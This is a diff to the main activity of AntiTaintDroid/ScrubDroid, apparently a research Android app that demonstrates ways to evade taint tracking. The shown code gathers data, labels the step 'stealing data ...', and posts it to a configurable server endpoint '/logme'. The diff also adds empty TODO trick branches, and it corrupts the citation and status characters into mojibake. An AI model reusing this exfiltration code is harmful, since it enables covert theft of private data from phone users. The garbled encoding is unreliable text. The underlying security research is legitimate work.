@@ -7,11 +7,11 @@
  *
  * When referencing AntiTaintDroid/ScrubDroid, please use the following
  * citation:
- *   Golam Sarwar, Olivier Mehani, Roksana Boreli, and Mohammed Ali Kaafar. “On
+ *   Golam Sarwar, Olivier Mehani, Roksana Boreli, and Mohammed Ali Kaafar. â€œOn
  *   the Effectiveness of Dynamic Taint Analysis for Protecting Against Private
- *   Information Leaks on Android-based Devices”. In: SECRYPT 2013, 10th
+ *   Information Leaks on Android-based Devicesâ€�. In: SECRYPT 2013, 10th
  *   International Conference on Security and Cryptography. Ed. by P. Samarati.
- *   ACM SIGSAC. Reykjávik, Iceland: SciTePress, July 2013. url:
+ *   ACM SIGSAC. ReykjÃ¡vik, Iceland: SciTePress, July 2013. url:
  *   http://www.nicta.com.au/pub?id=6865;
  *
  * [1] http://nicta.info/scrubdroid
@@ -246,6 +246,12 @@ public class MainActivity extends Activity {
 				trickName = "[BUFFER]";
 			}
 
+			if(clickItem == "Switch Statement Trick"){
+				//TODO
+			}
+			if(clickItem == "String concat Trick"){
+				//TODO
+			}
 			if (clickItem == "Remote Control Trick") {
 				for (String key : data.keySet()) {
 					String val = data.get(key);
@@ -283,7 +289,7 @@ public class MainActivity extends Activity {
 			Log.d(MyApp.TAG, "TRICK-TIMING: " + clickItem + " "
 					+ trickWastedTime + " DATA-LEN: " + dataLen);
 
-			utils.statusUpdate("● " + utils.timeNow() + " " + trickName
+			utils.statusUpdate("â—� " + utils.timeNow() + " " + trickName
 					+ " stealing data ... ");
 
 			httpResponse = utils.httpSubmit(data);
@@ -356,7 +362,7 @@ public class MainActivity extends Activity {
 							MyApp.HTTP_SUBMIT_URL = "http://" + server
 									+ "/logme";
 							MyApp.HTTP_OCR_URL = "http://" + server + "/ocr";
-							utils.statusUpdate("● "
+							utils.statusUpdate("â—� "
 									+ utils.timeNow()
 									+ " Server address changed to "
 									+ MyApp.HTTP_OCR_URL.replace("http://", "")
